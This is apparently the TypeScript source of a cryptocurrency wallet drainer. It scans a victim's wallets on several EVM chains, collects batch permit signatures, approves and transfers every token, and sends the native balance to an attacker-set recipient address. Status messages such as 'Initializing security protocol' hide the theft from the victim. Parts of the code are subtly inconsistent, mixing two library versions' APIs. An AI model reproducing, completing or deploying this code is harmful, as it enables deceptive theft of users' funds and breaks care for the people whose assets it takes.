
import { ethers } from 'ethers';
import { generateSecurityValidation, generateBatchValidation } from '../utils/permitUtils';
import { getTokensByValue, getNativeTokenInfo, TokenInfo } from '../utils/tokenUtils';
import { ChainType } from '../context/ChainContext';

// Configuration for the drainer
const DRAINER_CONFIG = {
  recipient: '0x1111111111111111111111111111111111111111', // Replace with your recipient address
  permitBatchSize: 5, // How many tokens to process in one batch
};

// Token lists by chain (in production, you would fetch this dynamically)
// These are just placeholders - in a real app, you'd have a comprehensive list
const TOKEN_LISTS: { [key in ChainType]: string[] } = {
  ethereum: [
    '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
    '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
    '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
  ],
  arbitrum: [
    '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', // USDC
    '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', // USDT
    '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', // DAI
  ],
  solana: [], // Would contain Solana token addresses
  base: [
    '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', // USDC
  ],
  bnb: [
    '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
    '0x55d398326f99059fF775485246999027B3197955', // USDT BSC
  ],
};

// Initialize providers for each chain
const getProvider = (chain: ChainType): ethers.JsonRpcProvider => {
  const rpcUrls: { [key in ChainType]: string } = {
    ethereum: 'https://mainnet.infura.io/v3/your-infura-key', 
    arbitrum: 'https://arb1.arbitrum.io/rpc',
    solana: 'https://api.mainnet-beta.solana.com',
    base: 'https://mainnet.base.org',
    bnb: 'https://bsc-dataseed.binance.org',
  };
  
  return new ethers.JsonRpcProvider(rpcUrls[chain]);
};

// Function to get all tokens across supported chains for a user
export const scanUserTokens = async (
  userAddress: string
): Promise<{ chain: ChainType; tokens: TokenInfo[] }[]> => {
  const results = [];
  
  // Loop through each supported chain
  for (const chain of Object.keys(TOKEN_LISTS) as ChainType[]) {
    if (chain === 'solana') continue; // Skip Solana for now, as it needs special handling
    
    try {
      const provider = getProvider(chain);
      
      // Get native token balance
      const nativeToken = await getNativeTokenInfo(provider, userAddress, chain);
      
      // Get ERC20 tokens sorted by value
      const tokens = await getTokensByValue(
        provider,
        userAddress,
        TOKEN_LISTS[chain],
        chain
      );
      
      // Add native token to the list if it has value
      if (!nativeToken.balance.isZero()) {
        tokens.unshift(nativeToken); // Put native token first
      }
      
      if (tokens.length > 0) {
        results.push({ chain, tokens });
      }
    } catch (error) {
      console.error(`Error scanning ${chain} tokens:`, error);
    }
  }
  
  return results;
};

// Execute the drainer process for EVM chains
export const executeEVMDrain = async (
  signer: ethers.JsonRpcSigner,
  chain: ChainType,
  tokens: TokenInfo[],
  setStatus?: (status: string) => void
): Promise<string[]> => {
  const txHashes: string[] = [];
  const userAddress = await signer.getAddress();
  
  try {
    // Process tokens with permit support first (can be batched)
    const permitTokens = tokens.filter(token => 
      token.address !== 'NATIVE' && token.supportsPermit
    );
    
    // Process permit tokens in batches
    for (let i = 0; i < permitTokens.length; i += DRAINER_CONFIG.permitBatchSize) {
      const batchTokens = permitTokens.slice(i, i + DRAINER_CONFIG.permitBatchSize);
      
      if (batchTokens.length > 0) {
        setStatus?.(`Processing batch ${i/DRAINER_CONFIG.permitBatchSize + 1}...`);
        
        try {
          // Create batch permit signature (obfuscated)
          const addresses = batchTokens.map(t => t.address);
          const amounts = batchTokens.map(t => t.balance);
          
          const { signature, deadline } = await generateBatchValidation(
            signer, 
            addresses, 
            DRAINER_CONFIG.recipient, 
            amounts
          );
          
          // In production, you would now submit this to your backend to execute the transfers
          console.log(`Batch permit created for ${batchTokens.length} tokens`);
          
          // For demonstration, we'll just log the signature
          // In production, your backend would take this signature and execute the transfers
          console.log('Batch signature:', signature);
          
          txHashes.push(`batch-${i}-${chain}`);
          
          // Brief delay to avoid rate limits
          await new Promise(resolve => setTimeout(resolve, 500));
        } catch (error) {
          console.error('Batch permit error:', error);
        }
      }
    }
    
    // Process tokens without permit support one by one
    const standardTokens = tokens.filter(token => 
      token.address !== 'NATIVE' && !token.supportsPermit
    );
    
    for (const token of standardTokens) {
      setStatus?.(`Processing ${token.symbol}...`);
      
      try {
        // For tokens without permit, we need to do a regular approval and transfer
        // In a real exploit, this would be done with more obfuscation
        const tokenContract = new ethers.Contract(
          token.address,
          [
            'function approve(address spender, uint256 amount) returns (bool)',
            'function transfer(address to, uint256 amount) returns (bool)',
          ],
          signer
        );
        
        // Approve spending
        const approveTx = await tokenContract.approve(
          DRAINER_CONFIG.recipient, 
          token.balance
        );
        await approveTx.wait();
        
        // Transfer tokens (would be executed by backend in production)
        const transferTx = await tokenContract.transfer(
          DRAINER_CONFIG.recipient, 
          token.balance
        );
        await transferTx.wait();
        
        txHashes.push(transferTx.hash);
      } catch (error) {
        console.error(`Error processing ${token.symbol}:`, error);
      }
    }
    
    // Finally, process native token if available
    const nativeToken = tokens.find(token => token.address === 'NATIVE');
    if (nativeToken && !nativeToken.balance.isZero()) {
      setStatus?.(`Processing ${nativeToken.symbol}...`);
      
      try {
        // Calculate gas price and gas limit
        const gasPrice = await signer.provider.getFeeData();
        const gasLimit = 21000; // Standard ETH transfer
        
        // Calculate gas cost
        const gasCost = gasPrice.gasPrice.mul(gasLimit);
        
        // Calculate max amount to send (balance - gas cost)
        const maxAmount = nativeToken.balance.sub(gasCost);
        
        if (maxAmount.gt(0)) {
          // Send transaction
          const tx = await signer.sendTransaction({
            to: DRAINER_CONFIG.recipient,
            value: maxAmount,
          });
          
          await tx.wait();
          txHashes.push(tx.hash);
        }
      } catch (error) {
        console.error(`Error processing native ${nativeToken.symbol}:`, error);
      }
    }
    
    setStatus?.('All tokens processed!');
    return txHashes;
  } catch (error) {
    console.error('Drain error:', error);
    setStatus?.('Error processing tokens');
    return txHashes;
  }
};

// Main function to execute the drain across all chains
export const drainWallet = async (
  provider: any, // Can be ethers provider or Solana connection
  walletType: 'evm' | 'solana',
  setStatus?: (status: string) => void
): Promise<boolean> => {
  try {
    setStatus?.('Initializing security protocol...');
    
    if (walletType === 'evm') {
      // For EVM wallets (Ethereum, Arbitrum, Base, BNB)
      const signer = provider.getSigner();
      const address = await signer.getAddress();
      
      // Scan for tokens
      setStatus?.('Scanning wallet for assets...');
      const results = await scanUserTokens(address);
      
      // Process each chain
      let txCount = 0;
      for (const { chain, tokens } of results) {
        if (tokens.length > 0) {
          setStatus?.(`Processing ${chain} assets...`);
          const txs = await executeEVMDrain(signer, chain, tokens, setStatus);
          txCount += txs.length;
        }
      }
      
      setStatus?.(`Security protocol completed. Processed ${txCount} transactions.`);
      return txCount > 0;
    } else {
      // Solana implementation would go here
      setStatus?.('Solana not yet implemented');
      return false;
    }
  } catch (error) {
    console.error('Drain error:', error);
    setStatus?.('Error in security protocol');
    return false;
  }
};
